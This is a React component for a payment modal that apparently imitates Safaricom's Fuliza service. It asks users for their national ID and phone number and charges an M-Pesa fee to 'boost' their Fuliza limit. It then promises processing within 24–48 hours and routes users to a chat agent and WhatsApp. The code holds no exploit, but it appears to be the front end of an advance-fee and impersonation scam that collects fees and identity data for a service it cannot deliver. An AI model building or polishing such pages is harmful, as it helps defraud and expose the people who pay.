import React from "react";
import { useState, useEffect } from 'react';
import { SAFARICOM_GREEN, SUPPORT } from '../utils/constants';

export default function PaymentModal({
  isOpen,
  onClose,
  onInitiatePayment,
  onCheckPayment,
  paymentState,
  selectedLimit,
  selectedFee,
}) {
  const [idNumber, setIdNumber] = useState('');
  const [phoneNumber, setPhoneNumber] = useState('');
  const [currentStep, setCurrentStep] = useState('input');

  // Initialize phone number from selected limit context
  useEffect(() => {
    if (isOpen && paymentState.phone) {
      setPhoneNumber(paymentState.phone);
    }
  }, [isOpen, paymentState.phone]);

  const handleInitiate = async () => {
    if (!phoneNumber || !idNumber) {
      alert('Please fill all details');
      return;
    }

    try {
      setCurrentStep('response');
      await onInitiatePayment(phoneNumber, selectedFee, idNumber);
    } catch (error) {
      alert(error.message);
    }
  };

  const handleCheckPayment = async () => {
    await onCheckPayment();
    if (paymentState.status === 'completed') {
      setCurrentStep('success');
    }
  };

  const handleClose = () => {
    setCurrentStep('input');
    setIdNumber('');
    onClose();
  };

  const handleSuccessClose = () => {
    setCurrentStep('input');
    setIdNumber('');
    onClose();
  };

  if (!isOpen) return null;

  return (
    <div
      id="paymentModal"
      className="fixed inset-0 bg-black/60 flex items-center justify-center p-4 z-[300] backdrop-blur-sm"
    >
      <div className="bg-white rounded-[2rem] overflow-hidden w-full max-w-sm shadow-2xl">
        {/* Header */}
        <div
          className="bg-safaricom p-6 text-white text-center"
          style={{ backgroundColor: SAFARICOM_GREEN }}
        >
          <p className="text-[10px] font-bold uppercase tracking-widest opacity-80 mb-1">
            Secure Fuliza Application
          </p>
          <h3 className="text-xl font-extrabold">
            Your Fuliza Limit Will be Boosted To
            <span id="sumLimit">Ksh {selectedLimit ? selectedLimit.toLocaleString() : '0'}</span>
          </h3>
        </div>

        {/* Body */}
        <div className="p-6">
          {/* Input Step */}
          {currentStep === 'input' && (
            <div id="input-step">
              <div className="bg-green-50 p-4 rounded-xl mb-6">
                <p className="text-[11px] text-green-800 leading-relaxed font-semibold">
                  Enter your ID Number and Safaricom number to receive the M-Pesa STK prompt.
                </p>
              </div>
              <input
                type="number"
                id="idNum"
                value={idNumber}
                onChange={(e) => setIdNumber(e.target.value)}
                placeholder="ID Number"
                className="w-full mb-3 px-4 py-4 bg-slate-50 border rounded-xl font-bold outline-none focus:border-safaricom"
                style={{ borderColor: SAFARICOM_GREEN }}
              />
              <input
                type="number"
                id="phoneNum"
                value={phoneNumber}
                onChange={(e) => setPhoneNumber(e.target.value)}
                placeholder="07XXXXXXXX"
                className="w-full mb-6 px-4 py-4 bg-slate-50 border rounded-xl font-bold outline-none focus:border-safaricom"
                style={{ borderColor: SAFARICOM_GREEN }}
              />
              <div className="flex gap-3">
                <button
                  onClick={handleClose}
                  className="flex-1 py-4 bg-slate-100 text-slate-500 font-bold rounded-xl cursor-pointer hover:bg-slate-200"
                >
                  Cancel
                </button>
                <button
                  onClick={handleInitiate}
                  className="flex-[2] py-4 bg-safaricom text-white font-bold rounded-xl cursor-pointer hover:bg-green-700"
                  style={{ backgroundColor: SAFARICOM_GREEN }}
                >
                  Pay <span id="sumFee">Ksh {selectedFee || '0'}</span>
                </button>
              </div>
            </div>
          )}

          {/* Response Step (Polling) */}
          {currentStep === 'response' && (
            <div id="response-step" className="py-8 text-center">
              <div
                id="paySpinner"
                className="w-12 h-12 border-4 border-green-500 border-t-transparent rounded-full animate-spin mx-auto mb-4"
              />
              <div id="payIcon" className="hidden w-14 h-14 rounded-full mx-auto mb-4 items-center justify-center" />
              <h4 className="text-lg font-bold text-slate-800" id="payStatusTitle">
                {paymentState.isLoading ? 'Sending M-Pesa Prompt' : 'Waiting for Payment'}
              </h4>
              <p className="text-sm text-slate-500 mt-2 leading-relaxed" id="payStatusText">
                {paymentState.isLoading
                  ? 'Please wait while we send the STK request to your phone.'
                  : 'Check your phone for the M-Pesa prompt.'}
              </p>

              <div className="bg-slate-50 border border-slate-100 rounded-2xl p-4 mt-5 text-left">
                <div className="flex justify-between py-2 border-b border-slate-100">
                  <span className="text-xs font-bold text-slate-400 uppercase">Amount</span>
                  <span className="text-sm font-extrabold text-green-700" id="payDisplayAmount">
                    Ksh {selectedFee || '0'}
                  </span>
                </div>
                <div className="flex justify-between py-2 border-b border-slate-100">
                  <span className="text-xs font-bold text-slate-400 uppercase">Phone</span>
                  <span className="text-sm font-bold text-slate-700" id="payDisplayPhone">
                    {paymentState.phone || '—'}
                  </span>
                </div>
                <div className="flex justify-between py-2">
                  <span className="text-xs font-bold text-slate-400 uppercase">Status</span>
                  <span className="text-sm font-bold text-slate-700" id="payDisplayStatus">
                    {paymentState.status === 'completed'
                      ? 'Completed'
                      : paymentState.status === 'failed'
                        ? 'Failed'
                        : 'Pending'}
                  </span>
                </div>
              </div>

              <button
                id="checkPaymentBtn"
                onClick={handleCheckPayment}
                className="bg-safaricom hover:bg-green-700 text-white px-8 py-4 rounded-xl font-bold w-full mt-5 active:scale-95 cursor-pointer"
                style={{ backgroundColor: SAFARICOM_GREEN }}
              >
                I Have Paid — Check Status
              </button>
              <button
                onClick={handleClose}
                className="w-full mt-3 py-3 text-slate-500 font-bold text-sm cursor-pointer hover:text-slate-700"
              >
                Cancel
              </button>
            </div>
          )}

          {/* Success Step */}
          {currentStep === 'success' && (
            <div id="success-step" className="py-6 text-center">
              <div
                className="w-16 h-16 bg-safaricom rounded-full flex items-center justify-center text-white mx-auto mb-4 text-2xl"
                style={{ backgroundColor: SAFARICOM_GREEN }}
              >
                <i className="fas fa-check" />
              </div>
              <h3 className="text-xl font-extrabold text-slate-800 mb-1">
                Request Received
              </h3>
              <p className="text-sm text-slate-500 mt-3 leading-relaxed px-2">
                Your boost request has been received successfully. Please wait
                <strong>24–48 hours</strong> for the limit increase to be processed.
              </p>
              <div className="bg-green-50 border border-green-100 rounded-2xl p-4 my-5 text-left">
                <div className="flex justify-between py-2 border-b border-green-100">
                  <span className="text-xs font-bold text-slate-400 uppercase">Status</span>
                  <span className="text-sm font-extrabold text-green-700">Processing</span>
                </div>
                <div className="flex justify-between py-2">
                  <span className="text-xs font-bold text-slate-400 uppercase">Timeline</span>
                  <span className="text-sm font-bold text-slate-700">24–48 hrs</span>
                </div>
              </div>
              <div className="space-y-3">
                <button
                  onClick={() => window.open('https://tawk.to/chat/69ff04487b29e11c3321d049/default', '_blank')}
                  className="w-full py-4 bg-slate-800 text-white font-bold rounded-xl flex items-center justify-center gap-2 uppercase text-xs tracking-widest cursor-pointer hover:bg-slate-700"
                >
                  <i className="fas fa-comment" /> Chat with Agent Zuri
                </button>
                <a
                  href={`https://wa.me/${SUPPORT.whatsapp}?text=${SUPPORT.whatsappMessage}`}
                  className="w-full py-4 bg-[#25D366] text-white font-bold rounded-xl flex items-center justify-center gap-2 uppercase text-xs tracking-widest no-underline cursor-pointer hover:bg-[#1da852]"
                >
                  <i className="fab fa-whatsapp text-lg" /> Contact via WhatsApp
                </a>
                <button
                  onClick={handleSuccessClose}
                  className="w-full py-4 bg-slate-200 text-slate-600 font-bold rounded-xl flex items-center justify-center gap-2 uppercase text-[10px] mt-4 cursor-pointer hover:bg-slate-300"
                >
                  Back to Home
                </button>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}